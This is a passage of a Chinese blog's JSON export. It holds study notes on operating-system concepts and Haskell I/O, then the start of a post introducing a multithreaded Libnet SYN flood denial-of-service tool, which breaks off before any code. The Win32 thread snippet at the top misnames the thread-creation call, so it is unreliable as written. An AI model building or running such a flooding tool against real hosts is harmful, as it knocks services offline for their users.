&#125; if ((Param = atoi(argv[1])) &lt; 0)&#123; return -1; &#125; ThreadHandle = CreateHandle( NULL, // default security attributes 0, // default stack size Summation, // thread function &amp;Param, // parameter to thread function 0, // default creation flags &amp;ThreadId); // returns the thread identifier if (ThreadHandle != NULL)&#123; WaitForSingleObject(ThreadHandle, INFINITE); CloseHandle(ThreadHandle); printf(\"sum = %d\\n\", Sum); &#125;&#125; 多线程问题 在多线程程序中，fork() 和 exec() 的语义有所改变：有的 UNIX 系统存在两种形式的 fork()，如果程序中一个线程调用 fork()，其中一种情况新进程会复制所有线程，另一种则只复制调用系统调用 fork() 的线程。 exec() 工作方式不变， 如果一个线程调用了系统调用 exec()，则exec()参数指定的程序会替换整个进程，包括所有线程 。 fork() 的两种工作方式和应用程序有关：如果调用 fork() 后立刻调用 exec()，则没必要复制所有线程，因为 exec() 会替换整个进程，此时应当只复制调用的线程，否则应当复制所有线程。 线程取消（thread cancellation） 指线程完成之前终止线程任务，要取消的线程通常称为 目标线程（target thread） ，目标线程的取消可在如下两种情况下发生： 异步取消（asynchronous cancellation） ：一个线程立刻终止目标线程 延迟取消（deferred cancellation） ：目标线程不断检查它是否应当终止 如果资源已分配给要取消的线程或要取消的线程正在更新与其他线程所共享的数据，则取消会非常麻烦。采用延迟取消时，只有当目标线程检查它在安全的点时才会取消，Pthread 称这些点为 取消点（cancellation point） 。 信号处理： 信号（signal） 在 UNIX中用来通知进程某个特定事件发生，根据需要通知信号的来源和事件理由，无论信号为异步还是同步，它们都具有同样的模式： 信号由特定事件产生 产生信号要发送给进程 信号一旦被发送就必须被处理 同步信号的例子包括访问违例内存或者除 0，同步信号发送到执行操作而产生信号的同一进程；如果一个信号由运行进程之外的事件产生，则进程异步接收这一信号，如使用Ctrl + C 终止或定时器到期。异步信号通常被发送到另一个进程。每个信号可能由两种可能的处理程序中的一种来处理： 默认信号处理程序 用户定义的信号处理程序 对于多线程程序，一个信号的接收者可以是以下四种： 信号适用（能够处理这个信号）的线程； 进程内的每个线程 进程内的部分固定线程 进程规定一个特定的线程来接收全部的信号 Windows 并不提供对信号的支持，但它们能通过 异步过程调用（asynchronous procedure call，APC） 来模拟。APC 工具允许用户线程指定一个函数以便在用户线程受到特定事件通知时能被调用。 线程池和特定数据 如果允许所有并发请求都通过新线程来处理，则没法限制在系统中并发执行的线程的数量。可使用 线程池（thread pool） 解决：在进程开始时创建一定数量的线程，并放入池中等待工作，当服务器收到请求则唤醒池中一个线程（如果有线程可用），并将要处理的请求传递给该线程；一旦一个线程完成了服务，它会返回池中等待工作。 线程池优点主要有： 使用现有线程处理请求比等待新创建线程更快 线程池限制了在任何时候可以使用的线程数量 有些情况下线程自己需要维持一定数据的副本，这类数据称为 线程特定数据（thread-specific data） 。 专栏目录：计算机理论基础此专栏的上一篇文章：操作系统（一）：概念导读此专栏的下一篇文章：操作系统（三）：CPU 调度 参考资料：《操作系统概念 英文第七版》，恐龙书，英文名《Operating System Concepts》，作者 Abraham Silberschatz、Peter Baer Galvin、Greg Gagne 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2016/11/22/os-concepts-2/) 、作者信息（Forec）和本声明。","categories":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}],"tags":[{"name":"OS","slug":"OS","permalink":"http://forec.github.io/tags/OS/"}],"keywords":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}]},{"title":"操作系统（一）：概念导读","slug":"os-concepts-1","date":"2016-11-22T02:07:44.000Z","updated":"2017-01-06T10:56:22.000Z","comments":true,"path":"2016/11/22/os-concepts-1/","link":"","permalink":"http://forec.github.io/2016/11/22/os-concepts-1/","excerpt":"整理《Operating System Concepts》 第七版前两章的理论和概念，内容均为原书和中文版翻译的摘录，其中原书摘录部分由我 按个人理解简化、翻译为中文，可能存在一些不准确之处 。","text":"整理《Operating System Concepts》 第七版前两章的理论和概念，内容均为原书和中文版翻译的摘录，其中原书摘录部分由我 按个人理解简化、翻译为中文，可能存在一些不准确之处 。 绪论（第一章）定义操作系统 操作系统（operating system） 是管理计算机硬件的一个程序，它同时作为用户和硬件的中间层，为应用程序提供了基础。 一个计算机系统可被大致划分为四个部件： 硬件（hardware） 、 操作系统 、 应用程序（application programs） 、 用户（users） 。 硬件（hardware） 包括： 中央处理器（central processing unit） 、 存储器（memory） 和 输入输出（I/O）设备 。操作系统控制并协调多个用户的多道程序。 从计算机的视角看，操作系统类似一个 资源管理器（resource allocator） ，它扮演了硬件资源管理者的角色。另一个略微有所不同的角度是，操作系统是一个控制程序，这个 控制程序（control program） 管理用户程序的执行以防止错误的发生和对计算机不合法的使用。 计算机系统最基本的目的是执行用户程序，并让用户问题的解决变得更容易。 操作系统组织 计算机用于启动的初始化程序被称作 引导程序（bootstrap program） ，它被存储在只读存储器（ROM）或电擦除只读存储器（EEPROM），也就是常说的固件。 一个事件的发生通常通过硬件或软件的 中断（interrupt） 来触发。硬件可能在任何时候通过向 CPU 发送一个信号来 触发（trigger） 中断，该信号通常经由总线传递。软件可能通过执行被称作 系统调用（system call） 的特殊指令来触发中断。 计算机程序必须在主存（也被称作 随机访问存储器（random-access memory） ）中执行。主存是 CPU 能直接访问的唯一的大容量存储，它通常由被称作 动态随机访问存储器（dynamic random-access memory，DRAM） 的半导体器件实现。主存是 易失（volatile） 存储，当电源关闭或其它问题出现时，其内容会丢失。因此多数计算机系统提供了 二级存储（secondary storage） 作为主存的扩展，二级存储设备通常是 磁盘（magnetic disk） 。 操作系统对每一个设备控制器均设置有一个 设备驱动（device driver） ，要启动一个 I/O 操作需经过如下步骤： 设备驱动设置设备控制器内部对应的寄存器 设备控制器检查其内部寄存器并确定要执行的行为 设备控制器启动数据传输，数据 从设备发送给本地缓存 一旦数据传输结束，设备控制器通过触发一个中断通知设备驱动 设备驱动将控制权交还给操作系统；如果 I/O 操作是读行为，则携带读取的数据或者指向数据的指针；如果 I/O 操作是其他行为，则返回状态信息。 大量数据移动通常使用 直接存储器访问（direct memory access，DMA） 。在为 I/O 设备设置缓冲区、指针、计数器后，设备控制器将整块数据直接从它的缓冲区发送到主存（或相反方向）而不经过 CPU。传输一块数据只会触发一次 CPU 中断。 计算机系统体系与结构 多处理器系统（multiprocessor system） ，也被称作 并行系统（parallel system） 或 轻耦合系统（lightly coupled system） 有以下三个主要优点： 增加吞吐量（throughput） 性价比高 ：相比多个单处理器系统，因为多处理器系统可以共享 外围设备（peripherals） 、 大容量存储器（mass storage） 和电源，因此花费更少。 增加可靠性（reliability） ：单处理器出现故障只会减缓系统而不会导致系统终止。根据存活硬件均衡提供服务的能力被称作 故障弱化（graceful degradation） 。有些系统具有 容错能力（fault tolerant） ，当任何一个单件出错时，系统能够继续运行。 多处理器系统主要有两种类型： 非对称多处理器（asymmetric multiprocessing） ：每个处理器被赋予一定特殊作业，一个主处理器用于控制系统，其它的处理器要么从主处理器获取信息，要么执行预定义的作业。 对称多处理器（symmetric multiprocessing，SMP） ：每个处理器均可执行操作系统中的所有作业，处理器之间不存在主从关系。 多道程序（multiprogramming） 通过组织作业（代码或数据）增加了 CPU 的利用率（utilization），CPU 无论何时均有一个作业在执行。 分时（time sharing） ，或者 多工（multitasking） 是多道程序在逻辑上的扩展，CPU 在多个程序间跳转执行，因为跳转速度很快，对于用户而言就可以与各个同时运行的程序交互。 分时需要 交互式（interactive） 的计算机系统，用户和系统之间应该可以直接交流，且 响应时间（response time） 应当足够短。 一个被装入主存并执行的程序被称作 进程（process） 。分时和多道程序需要主存中同时保持多个作业，因为主存通常不足以同时容纳这些作业，所以它们在执行前被存放在硬盘的 作业池（job pool） 中，它容纳了所有等待分配主存的进程。 如果多个作业因为主存空间不足而无法同时装载，那么系统要在作业间进行 作业调度（job scheduling） 。 在分时系统中，操作系统必须保证响应时间，这一点有时通过进程在主存和硬盘之间的 交换（swapping） 完成。一个更普遍的方式是 虚拟内存（virtual memory） ，它使用户可以运行远大于 物理内存（physical memory） 的程序。 操作系统运行 现代操作系统均为 中断驱动（interrupt driven） ，事件几乎都通过中断或陷阱来触发。 一个 陷阱（trap） 或者说 异常（exception） ，是软件产生的中断。触发的原因要么是错误的产生（例如除 0 操作或违例内存访问），要么是用户程序执行了对操作系统服务的特殊请求。 为了保证操作系统程序正确执行，我们需要区分系统程序段和用户程序段。因此设置了两个独立的操作 模式（modes） ： 用户模式（user mode） 和 内核/管理/系统/特权模式（kernel/supervisor/system/privileged mode） 。计算机硬件中需要加入一个 模式位（mode bit） 用于说明当前的模式为内核（0）还是用户（1）。 在系统启动时，硬件系统处于内核模式。之后操作系统被加载并且在用户模式中执行用户应用。当一个陷阱或者中断发生，硬件将从用户模式切换到内核模式。 我们将一些机器指令指定为可能产生有害作用的 特权指令（privileged instructions） ，硬件只允许特权指令在内核模式中运行。一旦系统调用被执行，它将被硬件视为一个软中断，中断向量将被传递给系统内部的一个服务程序，并且模式位切换至内核模式。 定时器（timer） 可使计算机在一定时间后被中断。在将控制权交还给用户之前，操作系统必须保证定时器已被设置，一旦定时器触发中断，控制权将自动交还给操作系统，操作系统会将该中断视作一个致命的错误（fatal error）或者给这个程序更多的执行时间。 进程管理 程序是被动的实体，而进程是主动（active）的实体。 一个进程要完成任务需要如下资源：CPU，存储器，文件和 I/O 设备。一个单线程的进程有一个 程序计数器（program counter） 指定下一条要执行的指令，多线程的进程有多个程序计数器。 进程是系统中的工作单元。通过在单 CPU 的复用，所有的进程都有机会并行执行。 操作系统需要对进程管理及以下相关行为负责： 创建或删除用户或系统进程 挂起或继续进程 为进程同步提供机制 为进程通信提供机制 为死锁的处理提供机制 操作系统结构（第二章）操作系统服务操作系统应提供如下服务。 用户接口（user interface） ，包括： 命令行接口（command-line interface，CLI） 批处理接口（batch interface） 图形化用户接口（graphical user interface，GUI） 程序执行（program execution） ：操作系统要能够将程序加载到主存并执行程序 输入/输出操作（I/O operations） ：运行中的程序可能需要涉及到文件或 I/O 设备的读写操作 文件系统控制（file-system manipulation） 通信（communications） ：通信可能通过 共享内存（shared memory） 或 消息传递（message passing） 实现 错误检测（error detection） ：操作系统应当能始终检测到可能的错误 资源分配（resource allocation） ：一些资源需要特殊的分配行为（如 CPU、主存和文件存储），有的还需要请求和释放代码（如 I/O 设备） 统计（accounting） ：操作系统需要对每个用户使用了多少不同的计算机资源做统计 安全防护（protection and security） ：保证所有对系统资源的请求都得以控制 用户接口和系统调用 有的操作系统将命令解释器（command interpreter）作为系统内核的一部分，有的（如 Windows XP 和 UNIX）将命令解释器作为一个特殊的程序。在存在多个可选命令解释器的系统中，它们通常被称作 壳（shell） 。命令解释器的主要功能是获取并执行下一条用户指定的指令，有两种执行的方式： 命令解释器本身包含了执行命令的代码：可执行命令的数量决定了命令解释器的大小 通过系统程序实现多数指令：命令解释器本身并不理解指令的含义，它仅仅通过命令指定一个文件，将其装载至主存并执行。例如 rm file.txt 将程序 rm 加载并传入参数 file.txt 执行 图形用户接口提供了一个桌面。 系统调用（system call） 为系统服务提供了一个接口。多数程序开发者并不接触这一细节等级的代码，他们通常使用 应用程序接口（application programming interface，API） 来编写程序。API 为应用程序开发者提供了一组函数，最常见的三组 API 如：Windows 系统的 Win32 API、基于 POSIX 系统的 POSIX API 和 Java API。使用 API 的背后实际涉及了系统调用。 系统调用和中断的异同点 ： 二者均有索引（系统调用编号-系统调用表、中断向量表），二者的执行均需切换到内核模式 二者触发条件不同：系统调用是主动请求（会被硬件视为软中断），中断是外部触发 中断和陷阱的不同点 ： 二者起点不同：陷阱是正在执行的程序主动发起的，中断是外部错误或动作产生 二者处理方式不同：程序的陷阱（异常）在响应后将停止执行，而程序在中断时保存断点，中断处理结束后从断点恢复执行 多数程序设计语言的运行时支持系统（一系列包含在编译器链接库中的函数）提供了 系统调用接口（system-call interface） ，它们将程序代码和操作系统提供的系统调用链接起来。每个系统调用都有一个对应的编号，系统调用接口维护了一个编号-系统调用的索引，它们截取应用程序调用的 API，调用操作系统内核中相关的系统调用，并返回系统调用状态及其他返回值。 向操作系统传递参数有三种方法：通过寄存器传递、内存的块/表、压入/弹出堆栈。 系统调用可被大致分为五类： 进程控制（process control） 、 文件管理（file manipulation） 、 设备管理（device manipulation） 、 信息维护（information maintenance） 和 通信（communications） 。 一个单任务系统： MS-DOS，它在计算机启动时运行一个命令解释器，当运行程序时，它将程序装入内存，并修改命令解释器的大部分内容来为新程序提供尽可能多的空间。之后将指令指针设为程序的第一条指令并运行程序，要么产生错误引起中断（此错误代码会被保存），要么程序执行一个系统调用以终止。最终命令解释器剩余部分程序继续执行，并从磁盘重新装入命令解释器的其他部分。这些步骤完成后，命令解释器会向用户/下一程序提供上一次运行的结果（保存的错误代码）。 多任务系统：FreeBSD，用户登录到系统时，从用户选择的 Shell 开始执行。为了启动新进程，Shell 执行 fork() 系统调用，所选择的程序通过 exec() 装入内存并执行。根据命令发布方式，Shell 要么等待进程结束，要么在后台执行进程并继续响应用户输入。 两种通信模型： 消息传递模型（message-passing model） ：通信进程通过彼此之间交换消息传递信息，直接/间接通过一个共同的邮箱。通信实体可能是同一主机的不同进程，也可能是通过网络相连的另一主机的进程。进程之间通过 主机名（host name） 和 进程名（process name） 作为标识符区分。 共享内存模型（shared-memory model） ：进程使用 shared memory create 和 shared memory attach 系统调用来获得其它进程所拥有内存区域的访问权。操作系统通常需要组织一个进程访问另一个进程的内存，要使用共享内存模型，需要两/多个进程都同意取消这一限制。数据的形式和位置由进程协商决定，不受操作系统控制，进程必须保证它们不会同时向同一地方写入。 区别：消息传递对交换少量数据更有效，对于计算机之间的通信也比共享内存更容易实现；共享内存允许最大速度通信（本地可以内存速度），并且比较方便，但需要保护和同步。 操作系统设计和实现 系统程序（system program） 为开发程序和执行程序提供了一个方便的环境，它们可分为： 文件管理（file management） 状态信息（status information） 文件修改（file modification） 程序语言支持（programming-language support） 程序装入和执行（program loading and execution） 通信（communications） 操作系统设计目标：分为 用户 目标 和 系统 目标 用户目标：系统应当方便、容易使用、容易学习、可靠、安全、快速 系统目标：操作系统应该容易设计、实现和维护，应该灵活、可靠、高效而没有错误 策略（policy） 和 机制（mechanism） 的区分：机制决定如何做（ how to do），而策略决定做什么（ what will be done） 操作系统结构 简单结构：利用最小的空间提供最多的功能，没有被划分为模块，如 MS-DOS 和最初的 UNIX。应用程序能够访问最底层的、基本的设备驱动，因此易受恶意程序的伤害。 分层方法（Layered Approach） ：采用自顶向下方法，将总的功能和特征划分为模块。模块化的其中方法是分层方法：将操作系统分为若干层（级），最底层（层0）为硬件，最高层（层N）为用户接口，分层结构类似一个同心圆。分层法最大的 优点在于构造和调试的简单化 （每层只能利用较低层的功能和服务、每层为高层隐藏了一定数据结构、操作和硬件存在），主要困难在于 对层的详细定义 和 相比其他方法的低效 。 微内核（microkernels） ：将操作系统中所有非基本部分从内核中移走，将它们实现为系统程序或用户程序，从而得到更小的内核。微内核通常包括最小的进程、内存管理和通信功能。Windows NT 系统采用了分层微内核，有些 UNIX 系统也采用了此种方式。 微内核的主要功能是使客户程序和运行在用户空间的各种服务之间通信，客户程序和服务之间不会直接交互，而是通过微内核的 消息传递 。 因为新服务可在用户空间增加而不需修改内核，因此 便于扩充操作系统 ；因为大多数服务作为用户而不是内核进程运行，因此提供了 更好的安全性和可靠性 。 因为使用消息传递，系统功能总开销增加，因此 系统性能下降 。 模块（modules） ：用面向对象技术生成模块化的内核，动态加载模块。内核可以提供核心服务，也可动态实现特定功能。该方法和微内核方法类似，核心模块只有核心功能以及其他模块加载、通信的相关信息，但模块方法中， 模块之间不需要调用消息传递来通信 。 示例：Mac OS X操作系统的结构，底层为 Mach 微内核，提供内存管理、远程程序调用（remote process call，RPC）和进程间通信（IPC）工具；BSD 提供 BSD 命令行接口，支持网络、文件系统、POSIX API 实现。 虚拟机和系统生成 虚拟机的基本思想是单个计算机（CPU、内存、硬盘、网卡等）硬件抽象为几个不同的执行部件。 虚拟机除了提供与基本硬件相同的接口外，不提供额外功能。每个进程都有一个与底层机器完全相同的（虚拟）副本。 虚拟机为每个虚拟系统提供 小型磁盘（minidisk） ，系统在物理磁盘上为小型磁盘分配所需要的磁道来实现。所有小型磁盘的大小之和必须小于可用的物理磁盘。 底层物理机器有两种模式：用户模式和内核模式，虚拟机软件本身在物理机器上运行在用户模式中，而虚拟机在虚拟系统中运行在内核模式，每个虚拟系统有虚拟用户模式和虚拟内核模式，这两种模式均运行在物理用户模式。 虚拟的 I/O 操作可能需要更少（脱机操作）或更多（解释执行）的时间。 优点：可用于研究、开发操作系统；不同系统资源具有完全的保护，各个虚拟机之间完全独立。 操作系统通常设计成能运行在一类计算机上，对于某类特定的计算机场所，配置生成系统的过程称为 系统生成（system generation，SYSGEN） 。需要考虑的信息有：使用什么CPU、多少可用内存、哪些可用设备、需要什么操作系统选项和参数值。这些信息确定后，系统管理员可用这些信息修改操作系统的源代码副本以完全重新编译操作系统；或者创建一个表，从预先编译过的库中选取模块，将这些模块连接起来生成操作系统；或者构造一个完全由表驱动的系统，所有代码都是系统的组成部分， 选择发生在执行时而不是编译时 ，现代多数操作系统均为此种方式。 系统引导 装入内核以启动计算机的过程称为 引导（booting） 系统，多数计算机中均有一小块代码，称为 引导程序（bootstrap program） 或 引导装载程序（bootstrap loader） ，这段代码将定位内核，将其装入内存并开始执行。引导程序被存放在只读存储器中。 对于大型操作系统（多数通用操作系统），引导程序存储在固件中，操作系统保存在磁盘上。引导程序运行后会从磁盘固定位置（0区块）读取整个引导块到内存，并执行这个 引导块（boot block） 中的代码。这个引导块足够复杂，它将一个完整的操作系统装载到内存开始执行。 专栏目录：计算机理论基础此专栏的上一篇文章：计组与体系结构笔记（六）：输入/输出与存储系统此专栏的下一篇文章：操作系统（二）：进程与线程 参考资料：《操作系统概念 英文第七版》，恐龙书，英文名《Operating System Concepts》，作者 Abraham Silberschatz、Peter Baer Galvin、Greg Gagne 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2016/11/22/os-concepts-1/) 、作者信息（Forec）和本声明。","categories":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}],"tags":[{"name":"OS","slug":"OS","permalink":"http://forec.github.io/tags/OS/"}],"keywords":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}]},{"title":"Haskell 中的非纯粹行为","slug":"haskell-io-actions","date":"2016-11-21T01:03:07.000Z","updated":"2016-11-21T16:26:00.000Z","comments":true,"path":"2016/11/21/haskell-io-actions/","link":"","permalink":"http://forec.github.io/2016/11/21/haskell-io-actions/","excerpt":"整理 Haskell 中的 I/O 行为和性质，包括惰性 I/O、异常、临时文件、缓冲等。","text":"整理 Haskell 中的 I/O 行为和性质，包括惰性 I/O、异常、临时文件、缓冲等。 基本 I/O 行为标准输入/输出 Prelude 定义了一些标准输入、输出及其函数： print：将任何可打印的值输出到标准输出设备 putStr：向标准输出输出字符串 putStrLn：向标准输出输出字符串并添加换行 getLine：从标准输入中读取一行 interact：其类型签名为 interact :: (String -&gt; String) -&gt; IO()，该函数接受一个签名为 String -&gt; String 的函数，对标准输入中的每个字符串做转换并输出。默认情况下 GHCI 采用 LineBuffering 模式，也就是每输入一行或输入足够长的情况下才产生一次回显 标准输入/输出实际是 System.IO 预定义的一些句柄，以上的getLine、putStr等函数实际是由其句柄函数封装得来的： stdin ：getLine = hGetLine stdin stdout：putStrLn = hPutStrLn stdout stderr：print = hPrint stdout 句柄和简化的文本文件读写System.IO 包中包含了多数 I/O 相关操作，其中大多数操作已被 Prelude 导入。Handle 类型是文件句柄，Haskell 从句柄读写数据。 openFile :: FilePath -&gt; IOMode -&gt; IO Handle：以文本方式打开一个文件并返回 IO Monad 包裹的句柄，其中 IOMode 包括： ReadMode：只读 WriteMode：只写 ReadWriteMode：读写 AppendMode：追加 openBinaryFile :: FilePath -&gt; IOMode -&gt; IO Handle：以二进制方式打开一个文件并返回 IO Monad 包裹的句柄，其中 IOMode 与 openFile 中相同 hIsEOF :: Handle -&gt; IO Bool：是否已读取到句柄末尾 hGetLine :: Handle -&gt; IO String：从句柄中读取一行，此函数应只在文本文件的句柄中使用 hPutStrLn :: Handle -&gt; String -&gt; IO ()：向句柄中写入字符串并添加换行 hPutStr :: Handle -&gt; String -&gt; IO ()：向句柄中写入字符串 hPrint :: Show a =&gt; Handle -&gt; a -&gt; IO ()：向句柄中写入可打印值（以上四个函数实际是标准输入/输出函数的内部实现）。注意此函数和 putStr 不同，此函数可打印任何实现了 Show 的实例的值，例如 hPrint stdout &quot;haskell&quot;，则标准输出为 &quot;haskell&quot;，而 hPutStr stdout &quot;haskell&quot; 在标准输出产生的是 haskell。 hClose :: Handle -&gt; IO ()：关闭句柄 hTell :: Handle -&gt; IO Integer：返回此句柄目前对应文件位置 hSeek :: Handle -&gt; SeekMode -&gt; Integer -&gt; IO ()：按 SeekMode 模式设置句柄位置，其中 SeekMode 包括： AbsoluteSeek：绝对定位，按照给定的 Integer 参数设置句柄位置 RelativeSeek：相对定位，相对当前句柄位置按给定参数修正 SeekFromEnd：从文件尾部定位，与 AbsoluteSeek 方向相反 hIsSeekable :: Handle -&gt; IO Bool：返回该句柄是否可以定位 hGetPosn :: Handle -&gt; IO HandlePosn：返回该句柄位置 hGetChar :: Handle -&gt; IO Char：从句柄读取一个字符 hGetContents :: Handle -&gt; IO String：读取句柄全部内容 hGetEcho :: Handle -&gt; IO Bool：获取一个链接到终端的句柄的回显状态 使用 openFile、writeFile 可处理文本文件，通常可简化为以下三种操作，其中 FilePath 是 String 的别名： readFile :: FilePath -&gt; IO String：接受一个 FilePath 作为文件名，打开该文件（如果存在的话）并以字符串返回文件内容 writeFile :: FilePath -&gt; String -&gt; IO()：接受一个 FilePath 作为文件名，向该文件写入字符串（如果文件不存在则创建，否则覆盖原文件） appendFile :: FilePath -&gt; String -&gt; IO ()：接受一个 FilePath 作为文件名，并想该文件附加字符串（无论文件是否存在都会写入） 序列化和语法糖 do 语法糖将执行非纯粹行为的代码包裹起来，其中： 整个代码块返回的值是代码块最后一行语句返回的值 在代码块中使用 &lt;- 从 I/O 行为中获取值 在代码块中使用 let 从纯粹代码中获取值，注意不是 let..in do 代码块返回的值与 return 函数无关，return 仅仅是将纯粹的值使用 Monad 包裹，与命令式语言中的 return 没有任何联系。在 I/O 操作中，return 的作用就是将纯粹值包裹到 IO Monad 中。 你可以假设，do 代码块中的每个语句（除了 let），都会产生一个待执行的 I/O 操作。 mapM 和 mapM_ 提供了在列表上应用 Monad 的方式，其中 mapM 返回应用后的列表，而 mapM_ 丢弃结果。 mapM :: (Monad m) =&gt; (a -&gt; m b) -&gt; [a] -&gt; m [b] mapM_ :: (Monad m) =&gt; (a -&gt; m b) -&gt; [a] -&gt; m () 以下两个函数将 Monad 操作连接起来，当 Monad 为 IO Monad 时即为 do 的内部实现 (&gt;&gt;) :: (Monad m) =&gt; m a -&gt; m b -&gt; m b：该函数连接两个 Monad 操作，首先执行第一个，之后执行第二个，返回是第二个 Monad 操作返回的值 (&gt;&gt;=) :: (Monad m) =&gt; m a -&gt; (a -&gt; m b) -&gt; m b：该函数执行第一个 Monad 操作，将其返回的结果传给第二个参数，第二个参数接受第一个 Monad 操作的结果，并返回另一个 Monad。例如 getLine &gt;&gt;= putStrLn 作用就是从键盘读取一行，再输出到屏幕。 文件操作和临时文件 涉及非内容的文件操作相关函数包含在 System.Directory 中，常见如： removeFile :: FilePath -&gt; IO()：删除参数名指向的文件 renameFile :: FilePath -&gt; FilePath -&gt; IO()：重命名文件，可等同于 mv 操作，但若第二个参数（重命名后的文件名）对应文件已存在，则该文件被要移动的文件覆盖。使用该操作应小心。 renameDirectory :: FilePath -&gt; FilePath -&gt; IO()：重命名文件夹 getTemporaryDirectory :: IO FilePath：获取当前机器的临时文件目录。有些机器并不存在默认的缓存目录，此时调用此函数将导致异常。因此此函数应当被 catchIOError 包裹。例如，catchIOError (getTemporaryDirectory) (\\_-&gt;return &quot;.&quot;)。 临时文件主要使用 openTempFile :: FilePath -&gt; String -&gt; IO(FilePath, Handle) 创建，对于二进制临时文件则使用 openBinaryTempFile。该函数第一个参数为要创建临时文件的目录，第二个参数为临时文件的前缀，例如 tempfile，则 Haskell 生成的临时文件会有类似 tempfileXXXXXX 的文件名，后面的 XXXXXX 为随机生成的序列。该函数会返回 IO Monad 包裹的路径和句柄。 在临时文件试用结束后，通常会通过 hClose 关闭临时文件句柄，之后 removeFile 删除临时文件。此部分处理工作应由 finally 包含以保证执行。 I/O 异常捕获处理 I/O 操作的异常捕获通过 catchIOError 执行，该函数包含在 System.IO.Error 中，签名为 catchIOError:: IO a-&gt; (IOError -&gt; IO a) -&gt; IO a。该函数接收两个 IO Monad 作为参数，如果第一个函数执行时产生异常，则执行第二个函数。 一个更通用的异常捕获函数是 catch，包含在 Control.Exception 中，可捕获任意类型 IO 异常。如果你使用 catch 则必须指定异常的类型，否则编译器会汇报模糊的定义错误。该函数类型签名为 catch:: Exception e =&gt; IO a -&gt; (e -&gt; IO a) -&gt; IO a，第二个参数是一个函数，这个函数接收异常并执行第二个 Monad （即 catchIOError 中捕获到异常后执行的 IO Monad）。这个函数必须指定错误 e 的类型，如果要涵盖所有错误，可以使用 e :: SomeException 来泛解析。 我们使用 finally 来确保一个 IO 操作的执行，其类型签名为 finally:: IO a-&gt; IO b -&gt; IO a，无论第一个 IO Monad 成功还是失败，第二个 IO Monad 都将执行，且整个代码块返回值为第一个 IO 行为的返回值。 缓冲模式和命令行参数 I/O 行为有如下几种缓冲模式： NoBuffering：不使用缓冲，按字符逐个读取/写入 LineBuffering：使用行缓冲，当一个换行符被输出或整个缓冲区已经足够长时，输出缓冲才被写入。在交互式终端中，一旦输入一个回车，则缓冲区将立刻被写入/读取。 BlockBuffering：块缓冲，在可能的情况下按固定大小的块读取/写入，在读写大数据的情况下性能更好，但它将阻塞输入（无法获得回显）直到块足够大。它的值构造器接受一个 Maybe 类型作为参数，如果是 Nothing 则使用预定义的缓冲区大小，否则如果输入是 Just 1024，则使用 1024 字节缓冲区。 使用 hGetBuffering Handle 可以获得参数句柄的缓冲模式。 使用 hSetBuffering Handle BufferMode 可以设置句柄的缓冲模式，例如 hSetBuffering stdin (BlockBuffering Nothing)。 命令行参数的读取可使用 System.Environment 中定义的函数： getArgs 返回 IO [String]，包含了命令行参数的列表，和 C 语言中的 argv 类似，这个列表的第一个元素是程序名，之后为其它参数。 程序名称可通过 getProgName :: IO String 获得。 指定的环境变量可通过 getEnv :: String -&gt; IO String 获得，返回 String 参数键对应的值。 全部的环境变量可通过 getEnvironment 获得，其返回值签名为 [(String, String)]。 在 POSIX 类系统中，可使用 putEnv 或 setEnv（包含在 System.Posix.Env 模块中） 设置环境变量。但该操作不跨平台，在 Windows 中不存在设置环境变量的方法。 System.Console.GetOpt 模块包含了更多处理命令行参数的函数。 惰性 I/O 在 Haskell 中，I/O 操作同样保持惰性。例如，hGetContents 会从一个文件中获取全部内容，返回 IO String。这里返回的 String 就将被惰性求值。无论是读取一个 500 GB 的大文件还是一个 2 KB 的小文件，hGetContents 均不会将文件读入内存。只有当真正使用到其返回的 String 时，这个读取动作才开始执行。 我们通常认为，只有 输出了对 I/O 返回值计算后的结果 才算使用到了其返回值。 当 hGetContents 返回的 String 在代码中不再被引用时，Haskell 的垃圾回收器将自动释放该部分内存。 惰性 I/O 的体现可以通过下面的代码看出：hPutStr并不是将整个 inpStr 读入内存，inpStr 仅当它写数据时才有效。当传输大文本文件时，你可以通过 readFile 和 writeFile 建立一个类似管道，内存使用不会很高，并且会很稳定。 123456789-- This example is modified-- Its sources from 《Real World Haskell》main = do inh &lt;- openFile \"input.txt\" ReadMode outh &lt;- openFile \"output.txt\" WriteMode inpStr &lt;- hGetContents inh hPutStr outh inpStr hClose inh hClose outh 注意：你不能在使用 I/O 动作返回的结果之前就关闭句柄，例如上面的例子，如果 hPutStr outh inpStr 和 hClose inh 交换顺序，则程序崩溃。因为 Haskell 的惰性求值，在 hPutStr 执行前，inpStr 并未真正读入内存。 惰性 I/O 可能导致副作用：I/O 操作返回的 String 将被纯粹的代码使用，但纯粹的代码并不知道这部分 String 是 I/O 行为的结果，因此当纯粹代码使用它的时候，可能会导致实际数据的读写。因此当需要和用户输入交互、或者输入数据随时间变化时，hGetContents 可能并不合适。 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2016/11/21/haskell-io-actions/) 、作者信息（Forec）和本声明。","categories":[{"name":"Language","slug":"Language","permalink":"http://forec.github.io/categories/Language/"}],"tags":[{"name":"Haskell","slug":"Haskell","permalink":"http://forec.github.io/tags/Haskell/"},{"name":"OS","slug":"OS","permalink":"http://forec.github.io/tags/OS/"},{"name":"函数式编程","slug":"函数式编程","permalink":"http://forec.github.io/tags/函数式编程/"}],"keywords":[{"name":"Language","slug":"Language","permalink":"http://forec.github.io/categories/Language/"}]},{"title":"基于 LibNET 的 SYN Flood 攻击","slug":"ddos-syn-attack","date":"2016-11-20T13:42:03.000Z","updated":"2016-11-20T15:54:30.000Z","comments":true,"path":"2016/11/20/ddos-syn-attack/","link":"","permalink":"http://forec.github.io/2016/11/20/ddos-syn-attack/","excerpt":"使用 C++ 基于 Libnet 编写的 SYN 洪水拒绝服务攻击工具，支持多线程。","text":"使用 C++ 基于 Libnet 编写的 SYN 洪水拒绝服务攻击工具，支持多线程。 原理 WIKIPEDIA：SYN flood WIKIPEDIA: Denial of service attack 以上两个链接分别是 SYN 洪水攻击和拒绝服务攻击的维基百科。基本原理就是在 TCP 建立连接的三次握手过程中，伪造其它 IP 